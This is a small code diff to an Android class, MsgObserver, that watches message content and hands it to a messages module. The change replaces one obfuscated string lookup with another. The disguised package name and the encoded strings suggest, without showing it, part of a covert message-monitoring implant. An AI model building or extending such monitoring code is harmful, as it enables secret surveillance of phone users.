@@ -9,12 +9,12 @@ import android.os.Handler;
 import android.os.Handler.Callback;
 import android.os.Message;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleMessage;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 public class MsgObserver extends ContentObserver implements Runnable {
 	private static final String TAG = "MsgObserver"; //$NON-NLS-1$
@@ -65,8 +65,8 @@ public class MsgObserver extends ContentObserver implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualBrowsing)");
 		}
-		// messages: Messages.getString("b_9");
-		ModuleMessage moduleMessage = (ModuleMessage) ManagerModule.self().get(Messages.getString("b_9"));
+		// messages: M.d("messages");
+		ModuleMessage moduleMessage = (ModuleMessage) ManagerModule.self().get(M.e("messages"));
 
 		if (moduleMessage == null) {
 			return;
